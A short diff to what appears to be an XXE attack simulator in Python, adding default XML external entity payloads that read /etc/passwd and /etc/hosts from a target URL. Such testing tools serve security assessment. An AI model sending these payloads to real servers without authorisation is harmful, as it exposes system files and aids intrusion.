@@ -51,9 +51,12 @@ DEFAULT_PAYLOADS = [
 class XXEAttack:
     """XXE attack simulator."""
 
-    def __init__(self, url: str, payloads: list[str], verbose: bool = False):
+    def __init__(self, url: str, payloads: list[str] | None = None, verbose: bool = False):
         self.url = url
-        self.payloads = payloads
+        self.payloads = payloads if payloads is not None else [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
+        ]
         self.verbose = verbose
         self.attempts = 0
         self.found_vulnerabilities = []
